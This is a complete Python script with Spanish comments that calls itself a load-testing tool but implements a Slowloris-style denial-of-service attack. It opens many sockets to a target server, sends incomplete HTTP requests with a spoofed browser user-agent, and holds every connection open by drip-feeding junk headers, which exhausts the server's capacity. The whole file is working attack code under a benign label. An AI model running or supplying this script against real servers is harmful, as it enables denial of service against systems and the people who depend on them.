import logging
import argparse
import threading
import socket
import random
import time

# Configuración del registro para monitorear la actividad del script
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Headers HTTP comunes a enviar en las solicitudes
regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

def init_socket(ip, port):
    """
    Inicializa una conexión socket y envía un request GET con headers.
    Gestiona excepciones para manejar errores de red y conexiones fallidas.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((ip, int(port)))
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('UTF-8'))
        for header in regular_headers:
            s.send('{}\r\n'.format(header).encode('UTF-8'))
        logging.info("Socket inicializado con éxito")
    except socket.error as e:
        logging.error(f"Error al establecer socket: {e}")
    return s

def send_keep_alive(sockets, timer, rate_limit):
    """
    Envía headers de Keep-Alive a todos los sockets activos.
    Implementa limitación de tasa de solicitudes por segundo.
    """
    request_interval = 1 / rate_limit if rate_limit > 0 else 0
    while True:
        logging.info(f"Enviando Keep-Alive Headers a {len(sockets)} sockets")
        for s in sockets:
            try:
                time.sleep(request_interval)  # Limitar la tasa de solicitudes
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
            except socket.error:
                sockets.remove(s)
        time.sleep(timer)

def main(args):
    """
    Función principal que maneja la creación de sockets y el envío de Keep-Alive.
    Utiliza argumentos de línea de comandos para configuración personalizada.
    """
    sockets = []
    for _ in range(args.socket_count):
        s = init_socket(args.ip, args.port)
        if s:
            sockets.append(s)

    # Iniciar el envío de Keep-Alive en un hilo separado
    threading.Thread(target=send_keep_alive, args=(sockets, args.timer, args.rate_limit)).start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script de Pruebas de Carga")
    parser.add_argument("ip", type=str, help="Dirección IP del servidor")
    parser.add_argument("port", type=int, help="Puerto del servidor")
    parser.add_argument("socket_count", type=int, help="Cantidad de sockets a crear")
    parser.add_argument("timer", type=int, help="Intervalo de tiempo entre envíos de Keep-Alive")
    parser.add_argument("--rate_limit", type=float, default=0, help="Limitación de tasa de solicitudes por segundo (0 para sin límite)")

    args = parser.parse_args()
    main(args)
